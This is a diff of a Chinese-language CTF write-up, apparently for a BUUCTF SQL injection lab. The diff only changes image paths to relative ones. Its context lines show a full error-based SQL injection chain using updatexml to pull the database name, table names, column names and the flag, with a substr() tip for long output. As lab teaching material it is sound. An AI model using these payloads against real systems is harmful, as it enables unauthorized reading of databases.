@@ -31,7 +31,7 @@ categories: ["Writeup"]
 id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
 ```
 
-![确认报错注入](/images/buu-sql-course-1/step1-error-based-sql.png)
+![确认报错注入](../../images/buu-sql-course-1/step1-error-based-sql.png)
 
 回显中出现 `~geek~`，确认当前数据库名为 `geek`。
 
@@ -43,7 +43,7 @@ id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
 id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
 ```
 
-![查询表名](/images/buu-sql-course-1/step2-table-name.png)
+![查询表名](../../images/buu-sql-course-1/step2-table-name.png)
 
 ### 3. 查列名
 
@@ -53,7 +53,7 @@ id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from informat
 id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='目标表名'),0x7e),1)%23
 ```
 
-![查询列名](/images/buu-sql-course-1/step3-column-name.png)
+![查询列名](../../images/buu-sql-course-1/step3-column-name.png)
 
 ### 4. 读取 flag
 
@@ -63,7 +63,7 @@ id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from informa
 id=1' and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23
 ```
 
-![读取 flag](/images/buu-sql-course-1/step4-get-flag.png)
+![读取 flag](../../images/buu-sql-course-1/step4-get-flag.png)
 
 > `updatexml` 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 `substr()` 分段读取。
 
